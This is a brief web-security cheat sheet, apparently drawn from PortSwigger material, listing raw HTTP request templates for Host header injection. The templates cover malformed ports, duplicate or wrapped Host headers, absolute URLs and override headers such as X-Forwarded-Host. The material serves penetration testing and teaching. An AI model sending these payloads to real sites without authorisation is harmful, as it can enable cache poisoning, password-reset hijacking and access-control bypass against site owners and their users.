- [Host_Header_Injection](#Host_Header_Injection)

# Host_Header_Injection

#### Malicious port
```
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```

#### Malicious subdomain
```
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```

#### Duplicate Host headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```

#### Absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

#### Line wrapping
```
GET /example HTTP/1.1
 Host: bad-stuff-here
Host: vulnerable-website.com
```

#### Inject headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here

X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

References
- https://portswigger.net
